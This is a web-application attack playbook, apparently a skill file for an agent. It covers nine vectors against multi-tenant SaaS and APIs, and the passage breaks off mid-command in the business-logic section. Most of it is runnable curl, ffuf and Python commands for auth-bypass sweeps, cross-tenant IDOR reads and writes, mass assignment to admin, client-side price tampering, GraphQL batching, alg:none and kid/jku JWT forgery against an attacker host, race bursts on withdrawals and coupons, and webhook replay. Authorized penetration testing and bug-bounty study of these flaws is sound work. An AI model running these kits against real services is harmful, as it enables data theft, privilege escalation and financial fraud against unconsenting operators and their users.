---
name: web2-vectors
description: Vector pack for sweeping the Web2 / SaaS / API seam -- the boundary between product/business-logic code and the auth/platform/security layer, where no single team owns whether EVERY route, verb, field, and object is actually covered.
---

# Web2 / SaaS / API Vector Pack

## The seam

Two disciplines build every B2B SaaS or API product. **Application/product developers** write handlers, ship features against a roadmap, and treat authorization as a solved dependency: "the middleware handles it." **The auth/platform/security team** owns the middleware, the session machinery, the IdP integration, the tenant model. Each side is competent on its own turf. The bug lives in the seam between them: the question of whether *every* route, *every* HTTP verb, *every* GraphQL field, *every* object ID, and *every* tenant boundary is actually enforced is owned by **no one**. The platform team built the gate; the product team decided (often implicitly, often by copy-paste) which handlers sit behind it. That decision is never audited as a unit because it is not a unit -- it is scattered across hundreds of route registrations, decorators, resolver definitions, and worker entry points.

**Candidate-target profile:** a multi-tenant SaaS or API product with (a) a REST and/or GraphQL surface, (b) a notion of organizations/teams/workspaces (tenant boundary), (c) role-based access (admin/member/viewer or per-feature entitlements), (d) a billing or entitlement layer, (e) at least one async path (webhooks, background jobs, queue workers, scheduled tasks) running *behind* the synchronous auth gate. Bonus signal: a public mobile/SPA client that does client-side gating, a recently-shipped feature set ("we just launched X"), an admin/internal panel, a partner/integration API with its own key scheme.

**The shared blind spot (the upshift analogue):** in upshift the contracts were audited to death while the backend that signs transactions was treated as a normal web project. Here the analogue is sharper and more universal: **the "happy path" is tested exhaustively, the auth middleware is reviewed as a component, but the *coverage* -- the cross-product of {all routes} × {all verbs} × {all fields} × {all object scopes} × {sync vs async entry} -- is never enumerated by anyone.** Product devs assume coverage is automatic. Platform devs assume product devs put handlers behind the gate. The F1 class (the upshift finding where `GET /x` was authenticated but `POST /x` was not) is the canonical instance: same resource, different verb, divergent enforcement, because two different people wrote the two handlers on two different days and the verb-level coverage was nobody's checklist.

---

## Variables used across kits

```bash
# ── Target identity ──────────────────────────────────────────────
export BASE="https://api.target.example"        # API origin
export WEB="https://app.target.example"          # web/SPA origin
export GQL="$BASE/graphql"                        # GraphQL endpoint (probe several: /graphql /api/graphql /v1/graphql /query)
export HOST="api.target.example"

# ── Identities: hold TWO accounts in TWO tenants for isolation tests ──
# A = your primary account, tenant TA;  B = second account, tenant TB (sock-puppet, separate org)
export TOK_A="eyJ...A"                             # bearer/session for account A (high enough priv to enumerate IDs)
export TOK_B="eyJ...B"                             # bearer/session for account B (different tenant)
export TOK_LOW="eyJ...low"                         # low-priv member in tenant TA (viewer/member role)
export COOKIE_A="session=...A"                      # cookie variant if not bearer
export TENANT_A="org_aaa"                           # tenant/org id A
export TENANT_B="org_bbb"                           # tenant/org id B

# ── Object IDs you legitimately own (seed the IDOR/BOLA sweeps) ──
export OBJ_A="inv_1000"                             # an object you own in tenant A
export OBJ_B="inv_2000"                             # an object account B owns in tenant B (target of cross-tenant read)

# ── Replay / webhook test material (V8) ──────────────────────────
export CAPTURED_SIG=""                              # a signature header captured from a legit webhook/signed request (for replay tests)
export RT="eyJ...refresh"                           # a refresh token issued to account A (for refresh-replay / rotation tests)

# ── Wordlists / tooling ──────────────────────────────────────────
export WL_API="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
export WL_OBJ="/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
export UA="Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"

# ── Helper: decode a JWT without verifying (header + payload) ──────
jwtd() { for p in 1 2; do echo "$1" | cut -d. -f$p | tr '_-' '/+' | base64 -d 2>/dev/null | jq .; done; }
# usage: jwtd "$TOK_A"

# ── Helper: timestamped raw curl that prints status + timing ──────
hit() { curl -sS -o /tmp/body.$$ -w 'HTTP %{http_code}  %{time_total}s  %{size_download}b\n' -A "$UA" "$@"; cat /tmp/body.$$ | head -c 800; echo; }
```

> Two accounts in two tenants is the non-negotiable setup. Almost every high-value finding on this surface is "A can reach B's object/tenant." Without B you can only argue; with B you can prove.

---

## V1 -- Auth-coverage matrix sweep (verb / route asymmetry -- the F1 class)

**What it is.** The flagship vector. For each resource the app exposes, enforcement is decided *per handler*, not per resource. `GET /invoices/{id}` goes through the auth decorator because the dev who wrote it copied the pattern; `POST /invoices/{id}/refund`, written three sprints later by someone else, missed it. Or a HEAD/OPTIONS/PATCH variant routes to a generic handler that skips the guard. Or a route exists in two routers (v1 legacy + v2) and only one is gated. This lives in the seam because the platform team's middleware *can* cover everything but only covers what the product team wired through it, and verb-level / version-level coverage is on nobody's checklist. This is the direct generalization of the upshift F1 finding.

**Detection kit.**
```bash
# 1) Enumerate the route surface. Prefer the source of truth: OpenAPI/Swagger.
for p in /openapi.json /swagger.json /v3/api-docs /api-docs /swagger/v1/swagger.json /.well-known/openapi.json; do
  hit "$BASE$p"
done
# Extract every path+method pair from a found spec:
curl -sS "$BASE/openapi.json" | jq -r '.paths|to_entries[]|.key as $p|.value|keys[]|"\(.|ascii_upcase) \($p)"' > /tmp/routes.txt
wc -l /tmp/routes.txt

# 2) For EVERY route, fire EVERY verb three ways: authed-high (A), low-priv (LOW), and NO auth.
#    Record status per (route, verb, identity). Divergence = the bug.
while read -r M RPATH; do  # RPATH not PATH: never clobber the shell PATH inside the loop body
  for label in "A:-H Authorization:Bearer $TOK_A" "LOW:-H Authorization:Bearer $TOK_LOW" "ANON:"; do
    id="${label%%:*}"; hdr="${label#*:}"
    code=$(curl -sS -o /dev/null -w '%{http_code}' -X "$M" $hdr -A "$UA" "$BASE$RPATH")
    printf '%-6s %-6s %-40s -> %s\n' "$id" "$M" "$RPATH" "$code"
  done
done < /tmp/routes.txt | tee /tmp/authmatrix.txt

# 3) Surface the asymmetries: same route, ANON or LOW gets a non-401/403 that A gets.
awk '{m[$3" "$2][$1]=$NF} END{for(k in m){a=m[k]["A"];lo=m[k]["LOW"];an=m[k]["ANON"];
  if(an!="" && an!="401" && an!="403" && an!="404") print "ANON-REACHABLE:",k,"A="a,"ANON="an;
  if(lo!="" && lo!="401" && lo!="403" && a!=lo) print "PRIV-DIVERGENCE:",k,"A="a,"LOW="lo}}' /tmp/authmatrix.txt

# 4) No spec? Brute the verb matrix on known routes (the F1 pattern: GET gated, POST/PUT/PATCH/DELETE not).
for r in /invoices/$OBJ_A /users/me /admin/settings /orgs/$TENANT_A/members; do
  for M in GET POST PUT PATCH DELETE OPTIONS HEAD; do
    code=$(curl -sS -o /dev/null -w '%{http_code}' -X "$M" -A "$UA" "$BASE$r")   # NO token
    printf 'ANON %-6s %-30s %s\n' "$M" "$r" "$code"
  done
done
# 5) Route-version shadow: v1 legacy often ungated. ffuf the version prefix.
ffuf -u "$BASE/FUZZ/invoices/$OBJ_A" -w <(printf 'v1\nv2\nv3\napi\ninternal\nlegacy\nbeta\n') -mc 200,201,202,204
```

**Observed-state / readback step.** A hit is PROOF, not argument, when the unauth/low-priv request *returns or mutates real data*. For a read: the ANON `GET`/`POST` body contains the same record fields you see as A (echo `inv_1000`'s amount/customer back). For a write: re-read the object as A after the unauth mutation and show the field changed (`status: pending` → `refunded`). Live = the divergent verb/version returns 2xx with a real body or causes an observable state delta on re-read; patched = it returns 401/403 for the same request. Capture the request and the *re-read response* in the same session.

**Instance example (illustrative).** A billing SaaS: `GET /api/v2/invoices/{id}` requires a bearer token, but `POST /api/v1/invoices/{id}/void` (legacy router, never migrated behind the v2 middleware) accepts an anonymous request and flips the invoice to `voided`. Re-reading the invoice as the owner shows `status: voided` -- an observed state delta caused by an unauthenticated caller. (Constructed, representative of the F1/verb-asymmetry class.)

**Generalization.** Beyond verb/version: (a) trailing-slash and case variants route to different handlers (`/Admin` vs `/admin`); (b) content-type-routed handlers (`Accept: application/json` vs `text/html`); (c) HTTP method override headers (`X-HTTP-Method-Override: DELETE` on a POST); (d) the same logical action exposed via REST *and* GraphQL *and* a gRPC reflection endpoint, gated in one but not all; (e) framework "catch-all" or static routes that shadow a guard. Highest value: a *mutating* verb reachable anon on a *financial* or *tenant-membership* object.

---

## V2 -- IDOR / BOLA (object-level authorization)

**What it is.** Authentication is present (you are logged in) but the handler never checks that *the authenticated principal owns the object it is acting on*. The middleware answers "who are you?"; it does not answer "may you touch object 1000?" -- that check belongs to the product handler, and the product dev assumed an opaque or unguessable ID was protection. OWASP API Security's #1 (BOLA). It lives in the seam precisely because authentication (platform) and authorization-of-the-object (product) are owned by different people and the second is silently skipped.

**Detection kit.**
```bash
# 1) Find ID-bearing endpoints from the spec/traffic; collect a couple of YOUR ids.
#    Then walk neighbors with YOUR token (TOK_A) -- if B's object answers, that's BOLA.
seq -f 'inv_%04g' 999 1010 | while read id; do
  code=$(curl -sS -o /tmp/b -w '%{http_code}' -H "Authorization: Bearer $TOK_A" "$BASE/invoices/$id")
  printf '%s -> %s  ' "$id" "$code"; jq -r '.customer // .owner // empty' /tmp/b 2>/dev/null; echo
done
# 2) UUID/ULID don't save them -- try the cross-account proof directly: A reads B's known id.
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/invoices/$OBJ_B" | jq '{id,owner,amount,tenant}'
# 3) BOLA on writes (worse): A mutates B's object.
curl -sS -X PATCH -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
     -d '{"status":"paid"}' "$BASE/invoices/$OBJ_B" -w '\n%{http_code}\n'
# 4) Nested / indirect ids: filenames, export jobs, signed-but-not-scoped urls.
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/exports/$OBJ_B/download" -o /tmp/x -w '%{http_code} %{size_download}\n'
# 5) ID in body, header, or path param often unguarded where the visible one is guarded:
curl -sS -H "Authorization: Bearer $TOK_A" -H "X-Account-Id: $TENANT_B" "$BASE/me/settings" | jq .
```

**Observed-state / readback step.** Proof = with `TOK_A` you retrieve fields of `OBJ_B` that only B should see (B's customer name, B's amount), or you mutate `OBJ_B` and then read it as B (`TOK_B`) to show the change you made is visible to B. Live = A's request to B's object returns B's data / persists A's write; patched = 403/404 (note: a *consistent* 404 on objects you don't own is the correct fix and is NOT a finding). Always confirm with the second account that the object is genuinely B's, not a shared/global record.

**Instance example (illustrative).** `GET /exports/{jobId}/download` checks the JWT is valid but not that `jobId` belongs to the caller's org. Account A requests B's export job ID and downloads B's full customer CSV. Readback: open the file, show rows tagged with tenant B's org id. (Constructed, canonical BOLA.)

**Generalization.** Look beyond the obvious numeric path id: ids embedded in JWT claims that the server trusts instead of re-deriving; ids in `Referer`/`Origin`-derived routing; predictable export/report/attachment names; "share" tokens that are scoped to a resource but not to a viewer; GraphQL `node(id:)` global-object lookups (see V6). Highest value: write/delete BOLA, or BOLA that yields PII/financial bulk data.

---

## V3 -- Cross-tenant isolation breaks

**What it is.** Multi-tenant SaaS partitions data by org/workspace. The isolation predicate (`WHERE tenant_id = :caller_tenant`) must be applied on *every* query, by *every* handler, in *every* path including search, export, webhooks replay, and admin tooling. Miss it in one query builder, one report job, one cache key, one search index, and tenant A sees tenant B's data. This is the macro version of V2: not one object but a whole tenant. It is a seam bug because the data-access layer (platform) provides a scoped client but product handlers can bypass it (raw query, wrong helper, a "global" admin client used in a user-facing path).

**Detection kit.**
```bash
# 1) List endpoints: do they return only YOUR tenant's rows? Count + sample tenant ids.
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/invoices?limit=200" \
  | jq '[.data[].tenant_id]|unique'        # expect EXACTLY [TENANT_A]; anything else = leak
# 2) Tenant selector tampering: many APIs accept an org id in path/header/query -- try B's.
for inj in "?org_id=$TENANT_B" ; do
  curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/invoices$inj" | jq '[.data[].tenant_id]|unique'
done
curl -sS -H "Authorization: Bearer $TOK_A" -H "X-Org-Id: $TENANT_B"  "$BASE/invoices" | jq '[.data[].tenant_id]|unique'
curl -sS -H "Authorization: Bearer $TOK_A" -H "X-Tenant: $TENANT_B"  "$BASE/invoices" | jq '[.data[].tenant_id]|unique'
# 3) Search / filter injection that escapes the scope (full-text indexes often un-scoped):
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/search?q=*&include=all" | jq '[.results[].tenant_id]|unique'
# 4) Pagination cursor leak: cursors are sometimes raw row offsets that cross tenants.
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/invoices?cursor=0&limit=1000" | jq '[.data[].tenant_id]|unique'
# 5) Sub-resource creation under another tenant: POST a child object pointing at B's parent.
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
     -d "{\"org_id\":\"$TENANT_B\",\"name\":\"x\"}" "$BASE/projects" -w '\n%{http_code}\n'
```

**Observed-state / readback step.** Proof = a list/search response under `TOK_A` contains rows whose `tenant_id` is `TENANT_B`, confirmed by reading the same rows as `TOK_B`; or a tenant-selector override (`X-Org-Id: $TENANT_B`) returns B's row count matching what B sees natively. Live = `unique` tenant set is `> 1` or equals `[TENANT_B]` under A's token; patched = always `[TENANT_A]`. The cross-account confirmation (B sees the same rows) is what converts "weird ids" into proven cross-tenant exposure.

**Instance example (illustrative).** A reporting endpoint builds its query from a `groupBy` parameter and forgets to AND the tenant scope when `groupBy=global`. `GET /reports/revenue?groupBy=global` under A's token returns aggregated revenue rows for every tenant, each tagged with its org id. Readback: B's org id appears with B's real monthly total, which B confirms from their own dashboard. (Constructed.)

**Generalization.** Hunt every place a tenant id is *taken from the request* rather than *derived from the session*: headers, query params, body fields, JWT claims that aren't re-validated, GraphQL variables. Also: shared caches keyed without tenant, search/analytics pipelines, webhook event payloads replayed across tenants, "impersonation"/support tooling reachable by normal users. Highest value: a list/export endpoint that returns *all* tenants (full-database read).

---

## V4 -- Mass assignment / parameter pollution

**What it is.** A handler binds the incoming JSON straight onto a model or update statement and trusts the field set the client *should* send. The client sends extra fields the product dev never intended to be writable: `role`, `is_admin`, `tenant_id`, `plan`, `credit_balance`, `email_verified`, `price`. The platform team owns the auth that says "you may update your profile"; the product team owns *which fields* of the profile, and "all of them" is the lazy default of an ORM bind. Seam bug: privilege is enforced at the route level, not the field level.

**Detection kit.**
```bash
# 1) Read your own object to learn its full field set (response often reveals writable-looking fields).
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/users/me" | jq 'keys'
# 2) Echo the object back on update with privilege fields appended -- see which stick.
curl -sS -X PATCH -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' -d '{
  "name":"poc","role":"admin","is_admin":true,"plan":"enterprise",
  "credit_balance":1000000,"email_verified":true,"tenant_id":"'$TENANT_B'"
}' "$BASE/users/me" | jq '{role,is_admin,plan,credit_balance,email_verified,tenant_id}'
# 3) Re-read to confirm persistence (don't trust the echo; the echo may reflect input without saving).
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/users/me" | jq '{role,is_admin,plan,credit_balance}'
# 4) Parameter pollution: duplicate keys, array vs scalar, nested override.
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
  -d '{"amount":1,"amount":1000000}' "$BASE/orders" -w '\n%{http_code}\n'   # last-key-wins parsers
curl -sS -X POST -H "Authorization: Bearer $TOK_A" --data-urlencode 'role=member' --data-urlencode 'role=admin' "$BASE/users/me"
# 5) JSON vs form-encoded divergence (different parsers, different field maps):
curl -sS -X PATCH -H "Authorization: Bearer $TOK_A" -d 'is_admin=true&plan=enterprise' "$BASE/users/me"
```

**Observed-state / readback step.** Proof = step 3 re-read shows `role: admin` / `plan: enterprise` / inflated `credit_balance` *persisted* after you set it via an endpoint that should only edit your name. Live = the privileged field reflects your injected value on a fresh read (and ideally a privileged action now succeeds -- e.g., you can now hit an admin route from V1's matrix); patched = the field is unchanged / the extra keys are rejected or ignored. The fresh-read-then-privileged-action chain is the killshot (see amplifiers).

**Instance example (illustrative).** `PATCH /users/me` binds the body onto the User ORM model. Sending `{"role":"owner"}` persists, and the user can now invite/remove members and change billing. Readback: re-read `/users/me` shows `role: owner`, then `POST /orgs/{id}/members` (previously 403) returns 201. (Constructed, classic mass-assignment privilege escalation.)

**Generalization.** Beyond `role`: foreign keys (`tenant_id`, `owner_id` → reassign objects to/from other tenants = V3 chain), monetary fields (`price`, `discount`, `balance`), state fields (`status`, `verified`, `approved`), timestamps (`createdAt` backdating), and nested object replacement (`{"plan":{"id":"enterprise"}}`). Highest value: writing a field that the *server* trusts in a later authorization or billing decision.

---

## V5 -- Client-side-only enforcement (price / role / quantity trusted from client)

**What it is.** The decision that should be the server's is shipped to the client and trusted on the way back. The SPA computes the price and POSTs it; the mobile app decides the user is "premium" and the API believes it; quantity/discount/tax computed in JS. The product team built the UX (client) and the API to match, and "the client already validated it" becomes an implicit server assumption. Platform team never sees the business invariant. The bug is the missing *server-side recomputation*.

**Detection kit.**
```bash
# 1) Inspect what the client sends on a purchase/checkout -- capture via mitmproxy or DevTools, then replay.
#    mitmproxy:  mitmproxy --mode regular --listen-port 8080   (point the SPA/mobile at it)
#    Look for request bodies carrying price/total/discount/role/entitlement.
# 2) Replay with adversarial values:
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' -d '{
  "sku":"plan_enterprise","price":0.01,"quantity":1,"discount":100,"currency":"USD"
}' "$BASE/checkout" | jq '{order_id,charged,price,status}'
# 3) Negative / overflow quantities (refund-by-buying-negative, integer wrap):
for q in -1 -1000 0 2147483648; do
  curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
    -d "{\"sku\":\"item_1\",\"quantity\":$q}" "$BASE/cart/add" -w "  q=$q -> %{http_code}\n" -o /dev/null
done
# 4) Entitlement asserted by client: send the "I am premium" flag the app would set.
curl -sS -H "Authorization: Bearer $TOK_A" -H 'X-Plan: enterprise' "$BASE/features/premium-export" -w '\n%{http_code}\n'
# 5) Cross-check the authoritative price/entitlement from a read endpoint vs what checkout accepted.
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/catalog/plan_enterprise" | jq '{list_price}'
```

**Observed-state / readback step.** Proof = an order/subscription is created at your injected price, confirmed by reading the order back (`charged: 0.01` on a plan whose catalog `list_price` is, say, 499) or by the account now holding an entitlement it did not pay for (`GET /features/premium-export` → 200 after a $0.01 "purchase"). Live = the server persists your client-supplied price/entitlement; patched = the server recomputes from the catalog and charges the real amount / rejects the mismatch. Quantify the loss as `list_price − charged` per unit, sourced from the catalog read.

**Instance example (illustrative).** Checkout accepts a `price` field. POSTing `price: 0.01` for an enterprise annual plan creates an active subscription charged 1 cent; `GET /subscriptions/{id}` confirms `status: active, amount: 1`. Loss = `49900 − 1` cents per seat-year. (Constructed.)

**Generalization.** Any value the server should *own*: price, tax, currency, discount/coupon application, plan/tier, feature flags, role, rate limits, expiry dates, "trial" status. Also client-supplied signatures/hashes the server doesn't re-verify, and client-decided idempotency keys (chains into V8). Highest value: a price/quantity field that maps to real money charged or credited.

---

## V6 -- GraphQL: introspection + field-level authz + batching/alias abuse

**What it is.** GraphQL collapses the route surface into one endpoint, which moves *all* authorization to the field/resolver level. The platform team's route middleware is now nearly useless; each resolver must enforce its own object- and field-level checks, and many don't. Introspection (often left on) hands you the entire schema. `node(id:)` global lookups are BOLA at the type system level. Aliases and array-batched queries defeat per-request rate limits and amplify other vectors. The seam: REST mental models ("the gateway authed the request") fail silently on a per-field-authz system.

**Detection kit.**
```bash
# 1) Probe for the endpoint + introspection.
for g in /graphql /api/graphql /v1/graphql /query /gql; do hit -X POST -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}' "$BASE$g"; done
# 2) Full introspection dump (if enabled) -> map the schema, find mutations + sensitive fields.
read -r -d '' INTRO <<'Q'
{"query":"query IntrospectionQuery { __schema { types { name kind fields { name type { name kind ofType { name } } } } mutationType { fields { name } } } }"}
Q
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' -d "$INTRO" "$GQL" \
  | tee /tmp/schema.json | jq -r '.data.__schema.mutationType.fields[].name'    # mutation inventory
jq -r '.data.__schema.types[]|select(.fields)|.name as $t|.fields[]|select(.name|test("(?i)email|token|secret|ssn|key|balance|role|admin"))|"\($t).\(.name)"' /tmp/schema.json
# 3) Field-level authz: query a sensitive field on an object you shouldn't see (global node id = BOLA).
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
  -d "{\"query\":\"{ node(id:\\\"$OBJ_B\\\"){ ... on Invoice { amount owner { email } } } }\"}" "$GQL" | jq .
# 4) Batching / alias amplification (rate-limit + IDOR brute in ONE request):
python3 - <<'PY' > /tmp/batch.json
ids=[f"inv_{i}" for i in range(1000,1100)]
q="{"+ " ".join(f'a{i}: invoice(id:"{x}"){{amount owner}}' for i,x in enumerate(ids)) +"}"
import json; print(json.dumps({"query":q}))
PY
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' -d @/tmp/batch.json "$GQL" | jq '[.data|to_entries[]|select(.value!=null)]|length'
# 5) Introspection-off bypass: field suggestion errors leak names; query with a typo.
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
  -d '{"query":"{ usr { id } }"}' "$GQL" | jq -r '.errors[].message'   # "Did you mean user?"
# Tooling: clairvoyance (schema recovery w/o introspection), graphw00f (engine fingerprint), inql (Burp).
```

**Observed-state / readback step.** Proof = a sensitive field on *another tenant's* object returns real data through `node(id:)` or a typed query (`owner.email` of B's invoice), confirmed against B's account; or a batched alias query returns N other-tenant objects in one request (count of non-null aliases > 1 across foreign ids). Live = foreign field resolves with data; patched = `null` with an authorization error or a consistent not-found. Distinguish "field exists but null for unauthorized" (correct) from "field returns data" (bug).

**Instance example (illustrative).** Introspection is disabled in prod, but error-message field suggestions reconstruct the schema, revealing `mutation setUserRole`. The mutation lacks an authz check beyond authentication; a member calls `setUserRole(userId: self, role: ADMIN)` and the re-read of `viewer { role }` returns `ADMIN`. (Constructed; mirrors V4 at the resolver layer.)

**Generalization.** Check: introspection on/off, query depth/complexity limits (DoS), alias/batch caps, persisted-queries bypass, `@skip/@include` directive tricks, mutations missing object-level checks, subscriptions (often the least-reviewed resolvers), and the gateway-vs-resolver auth split in federated graphs (Apollo Federation: subgraphs trusting the gateway's claims without re-checking). Highest value: a mutation or `node()` lookup that crosses tenants or escalates role.

---

## V7 -- JWT / session / auth state-machine flaws

**What it is.** The auth artifact itself and its lifecycle. JWT verification weaknesses (`alg:none`, algorithm confusion RS→HS, unverified `kid`/`jku` pointing at attacker keys), session fixation, missing rotation on privilege change, refresh-token replay, password-reset/email-change/2FA-enable state-machine races and skips. The platform team owns this and is usually careful about the *core* verify, but the *transitions* (reset, link account, change email, step-up MFA, impersonation exit) are where product flows touch the auth machine and the invariants slip. Seam: the verify is solid; the state machine around it is co-owned and under-specified.

**Detection kit.**
```bash
jwtd "$TOK_A"                                  # inspect header alg + payload claims
# 1) alg:none + alg confusion (use a real tool; jwt_tool is the standard).
#    jwt_tool $TOK_A -X a            # alg:none family
#    jwt_tool $TOK_A -X k -pk pubkey.pem   # RS256->HS256 confusion using the leaked/derivable public key
#    jwt_tool $TOK_A -X i -I -pc sub -pv victim_id   # inject/modify claims, re-sign per attack
# 2) Claim tampering by hand (only proves it if verify is broken -- pair with step 1):
H=$(printf '{"alg":"none","typ":"JWT"}'|base64|tr -d '=\n'|tr '/+' '_-')
P=$(printf '{"sub":"%s","role":"admin"}' "$TENANT_B"|base64|tr -d '=\n'|tr '/+' '_-')
curl -sS -H "Authorization: Bearer $H.$P." "$BASE/users/me" | jq '{sub,role}'
# 3) kid/jku/x5u SSRF & key injection (server fetches your key):
#    set header kid: "../../dev/null" or jku: "https://attacker/jwks.json" via jwt_tool -S, then replay.
# 4) Session lifecycle: does logout / password change actually revoke the OLD token?
OLD="$TOK_A"; # change password via the app, then:
curl -sS -o /dev/null -w 'old-token-after-pwchange: %{http_code}\n' -H "Authorization: Bearer $OLD" "$BASE/users/me"
# 5) Refresh-token replay: use a refresh token twice; expect the 2nd to fail (rotation).
curl -sS -X POST -d "{\"refresh_token\":\"$RT\"}" -H 'Content-Type: application/json' "$BASE/auth/refresh"
curl -sS -X POST -d "{\"refresh_token\":\"$RT\"}" -H 'Content-Type: application/json' "$BASE/auth/refresh" -w '\nreplay -> %{http_code}\n'
# 6) Email-change / reset state machine: can you change email without re-auth, or bind reset token to another account?
```

**Observed-state / readback step.** Proof for verify flaws = a forged/confused token is *accepted*: the server returns the victim's `/users/me` (their email/id), or a token you minted with `role:admin` grants an admin route from V1's matrix. Proof for lifecycle flaws = the OLD token still returns 200 *after* logout/password-change (observable: same token, before vs after, both 200), or the same refresh token mints two access tokens. Live = forged/stale token accepted; patched = 401. Always show the before/after status for lifecycle bugs.

**Instance example (illustrative).** The API verifies JWTs but trusts the `kid` header to select a key from a directory; `kid: "key1/../../public/jwks-test.json"` path-traverses to a test key whose private half ships in the repo. A token signed with that key and `role: admin` is accepted; `GET /admin/users` returns the full user list. (Constructed; representative of the `kid`-injection class.)

**Generalization.** Also: missing audience/issuer checks (token from a sibling service accepted), expired-token grace windows, JWT used as a session without revocation list, OAuth/OIDC `state`/`nonce`/PKCE omissions, SAML/SIWE-style signature-scope confusion, impersonation tokens that don't expire on support-session exit, and "remember me" tokens with no rotation. Highest value: forge-an-admin or assume-a-victim with a token the server mints/accepts.

---

## V8 -- Race conditions / idempotency / replay

**What it is.** A request that is safe once becomes an exploit when fired N times concurrently, because the check and the mutation are not atomic (TOCTOU), or because the operation lacks an idempotency key and is replayable. Coupon redeem, withdrawal, invite-accept, vote, "claim once" bonus, balance debit. The product dev wrote a sequential mental model ("check balance, then debit"); the platform/infra reality is concurrent workers and at-least-once delivery. The seam: business logic assumes serial execution; the runtime is parallel, and *no one* specified the locking/idempotency contract between sync API and async worker.

**Detection kit.**
```bash
# 1) Single-packet / parallel burst. Modern tool: Turbo Intruder (Burp) "race-single-packet-attack".
#    CLI approximation with curl parallelism -- fire the same mutation N times at once:
seq 30 | xargs -P30 -I{} curl -sS -o /dev/null -w '%{http_code}\n' \
  -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
  -d '{"code":"WELCOME50"}' "$BASE/coupons/redeem" | sort | uniq -c
# 2) Idempotency-key replay: does re-sending the SAME key double-apply?
KEY=$(uuidgen)
for i in 1 2; do curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H "Idempotency-Key: $KEY" \
  -H 'Content-Type: application/json' -d '{"amount":100}' "$BASE/withdrawals" -w "  try$i -> %{http_code}\n" -o /dev/null; done
# 3) No-key replay: just re-send a withdrawal/transfer twice fast.
seq 10 | xargs -P10 -I{} curl -sS -o /dev/null -w '%{http_code}\n' -X POST -H "Authorization: Bearer $TOK_A" \
  -H 'Content-Type: application/json' -d '{"to":"acct_x","amount":50}' "$BASE/transfers"
# 4) Webhook / async replay: capture a provider webhook, resend it (signature reuse if timestamp not bound).
curl -sS -X POST -H 'Content-Type: application/json' -H "Stripe-Signature: $CAPTURED_SIG" \
  --data-binary @/tmp/captured_webhook.json "$BASE/webhooks/stripe" -w '\nreplay -> %{http_code}\n'
# 5) State-machine double-advance: accept the same invite / approve the same request twice concurrently.
```

**Observed-state / readback step.** Proof = a balance/ledger read shows the operation applied *more times than allowed*: coupon balance read shows the discount granted 7× (count the 200s, then read the wallet/credit), or two withdrawals of 100 left the account 200 lighter while only 100 was authorized. Live = `count(applied) > 1` for a once-only operation, visible on a fresh read of the affected balance/state; patched = exactly one apply (the rest 409/422/idempotent-replay-of-first). Quantify loss as `(applied − 1) × unit`.

**Instance example (illustrative).** A "first deposit +50 credit" bonus has no lock. Firing 20 concurrent `POST /bonus/claim` yields 20 applied; the wallet read goes from 0 to 1000 credits. Readback: `GET /wallet` shows `credits: 1000` against a `bonus_amount: 50` config. (Constructed; canonical TOCTOU bonus race.)

**Generalization.** Targets: any "once" or limited operation (referral, trial, vote, claim, redeem, reservation, seat purchase against inventory), any debit/transfer/withdrawal, any state advance (`draft→submitted→approved` skipping a step under concurrency). Also signature-replay on webhooks where the signature doesn't bind a nonce/timestamp window, and 2FA brute under a window where the rate limit is per-sequential not per-concurrent. Highest value: a money-moving or inventory-depleting op with no idempotency contract.

---

## V9 -- Business-logic flaws (coupon / refund / limit / workflow-state)

**What it is.** The rules that are *only* in the product team's head: how coupons stack, what a refund recomputes, what order steps may be skipped, what limits mean. There is no auth bug and no race; the *policy itself* is exploitable as implemented. The platform team has no view into business invariants; the product team encodes them ad hoc per handler. The seam is between "the system is secure" (platform's claim) and "the system enforces our business rules" (which no security review covered).

**Detection kit.**
```bash
# 1) Coupon stacking / reuse / negative: apply the same code repeatedly or combine exclusive codes.
for c in SAVE10 SAVE10 SAVE10; do curl -sS -X POST -H "Authorization: Bearer $TOK_A" \
  -H 'Content-Type: application/json' -d "{\"code\":\"$c\"}" "$BASE/cart/coupon"; done
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/cart" | jq '{subtotal,discount,total}'   # total < 0 ?
# 2) Refund > paid, or refund-to-different-instrument:
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
  -d '{"order_id":"'$OBJ_A'","amount":999999}' "$BASE/refunds" | jq '{refund_id,amount,status}'
# 3) Workflow-state skip: jump straight to a terminal/privileged state.
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
  -d '{"status":"shipped"}' "$BASE/orders/$OBJ_A" -w '\n%{http_code}\n'    # without paying
# 4) Limit bypass: per-account quota enforced on the account, evaded via second account/tenant or unit change.
#    Compare the limit doc vs what the API actually rejects:
curl -sS -H "Authorization: Bearer $TOK_A" "$BASE/account/limits" | jq .
# 5) Free-trial / time-based: backdate a date field (chains V4), or re-trigger trial via email alias / re-signup.
# 6) Currency / unit confusion: pay in a cheap currency, value credited in another; or cents vs dollars.
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
